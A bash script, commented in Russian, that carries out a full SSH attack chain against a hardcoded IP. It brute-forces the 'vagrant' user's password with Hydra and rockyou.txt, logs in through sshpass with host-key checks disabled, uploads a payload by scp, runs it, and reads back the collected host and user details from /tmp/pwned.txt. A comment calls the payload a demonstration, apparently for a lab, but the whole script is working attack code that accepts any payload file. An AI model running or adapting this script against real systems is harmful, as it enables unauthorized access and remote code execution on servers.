#!/bin/bash

# Конфиги
TARGET_IP="33.57.84.200"
TARGET_PORT="22"
TARGET_USER="vagrant" 
WORDLIST="rockyou.txt"
PAYLOAD_FILE="payload.sh" 
LOG_FILE="attack_log.txt"


# Цвета
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo "[*] Начинаем атаку на $TARGET_IP:$TARGET_PORT"
echo "[*] $(date)" >> $LOG_FILE

# Bruteforce SSH пароля с помощью Hydra
echo -e "${BLUE}[+]${NC} 1. Bruteforce пароля с помощью Hydra..."

# Переменная для отслеживания найденного пароля
PASSWORD=""
FOUND=0

while IFS= read -r line; do
    echo "$line" | tee -a $LOG_FILE
    
    # Ищем строку с найденным паролем
    # Hydra выводит что-то вроде: [22][ssh] host: 33.57.84.200   login: vagrant   password: my_password
    if echo "$line" | grep -qi "\[22\]\[ssh\].*password:"; then
        # Пытаемся несколько вариантов парсинга
        PASSWORD=$(echo "$line" | grep -oP 'password:\s*\K\S+' | head -1)
        
        # Если первый вариант не сработал, пробуем второй
        if [ -z "$PASSWORD" ]; then
            PASSWORD=$(echo "$line" | sed -n 's/.*password:\s*\(\S*\).*/\1/p')
        fi
        
        if [ ! -z "$PASSWORD" ]; then
            echo -e "${GREEN}[✓]${NC} Пароль найден: $PASSWORD" | tee -a $LOG_FILE
            FOUND=1
            break
        fi
    fi
    
    # Дополнительный признак успеха Hydra
    if echo "$line" | grep -qi "1 of 1 target successfully completed"; then
        echo -e "${YELLOW}[!]${NC} Hydra завершила работу" | tee -a $LOG_FILE
        break
    fi
    
done < <(hydra -l $TARGET_USER -P $WORDLIST -v -f \
    ssh://$TARGET_IP:$TARGET_PORT 2>&1)

# Проверяем, найден ли пароль
if [ -z "$PASSWORD" ]; then
    echo -e "${RED}[-]${NC} Пароль не найден" | tee -a $LOG_FILE
    exit 1
fi

echo -e "${GREEN}[✓]${NC} Пароль для использования: $PASSWORD" | tee -a $LOG_FILE

# Проверяем подключение
echo -e "${BLUE}[+]${NC} 2. Проверка подключения SSH..." | tee -a $LOG_FILE
sleep 1

if ! sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=5 \
    $TARGET_USER@$TARGET_IP "echo 'SSH connection successful'" 2>&1 | tee -a $LOG_FILE; then
    echo -e "${RED}[-]${NC} Не удалось подключиться по SSH" | tee -a $LOG_FILE
    exit 1
fi

echo -e "${GREEN}[✓]${NC} SSH подключение успешно!" | tee -a $LOG_FILE

# Загружаем и выполняем payload
echo -e "${BLUE}[+]${NC} 3. Загрузка вредоноса на целевой сервер..." | tee -a $LOG_FILE

# Создаём простой payload, если его нет
if [ ! -f "$PAYLOAD_FILE" ]; then
    cat > $PAYLOAD_FILE << 'EOF'
#!/bin/bash
# Простой вредоносный payload для демонстрации
echo "Payload executed on $(hostname) at $(date)" > /tmp/pwned.txt
echo "User: $(whoami)" >> /tmp/pwned.txt
echo "Current directory: $(pwd)" >> /tmp/pwned.txt
echo "System info: $(uname -a)" >> /tmp/pwned.txt
EOF
    chmod +x $PAYLOAD_FILE
    echo -e "${YELLOW}[!]${NC} Payload создан: $PAYLOAD_FILE" | tee -a $LOG_FILE
fi

# Загружаем payload через SCP
if ! sshpass -p "$PASSWORD" scp -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    $PAYLOAD_FILE $TARGET_USER@$TARGET_IP:/tmp/payload.sh 2>&1 | tee -a $LOG_FILE; then
    echo -e "${RED}[-]${NC} Не удалось загрузить файл" | tee -a $LOG_FILE
    exit 1
fi

echo -e "${GREEN}[✓]${NC} Payload загружен" | tee -a $LOG_FILE

# Выполняем payload
echo -e "${BLUE}[+]${NC} 4. Выполнение полезной нагрузки на целевом сервере..."
sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    $TARGET_USER@$TARGET_IP "bash /tmp/payload.sh" 2>&1 | tee -a $LOG_FILE

echo -e "${GREEN}[✓]${NC} Payload выполнен" | tee -a $LOG_FILE

# Проверяем результаты
echo -e "${BLUE}[+]${NC} 5. Проверка результатов на целевом сервере..."
echo "" | tee -a $LOG_FILE
echo "=== РЕЗУЛЬТАТЫ ===" | tee -a $LOG_FILE
sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    $TARGET_USER@$TARGET_IP "cat /tmp/pwned.txt" 2>&1 | tee -a $LOG_FILE
echo "==================" | tee -a $LOG_FILE
echo "" | tee -a $LOG_FILE

echo -e "${GREEN}[✓]${NC} Атака завершена успешно!" | tee -a $LOG_FILE
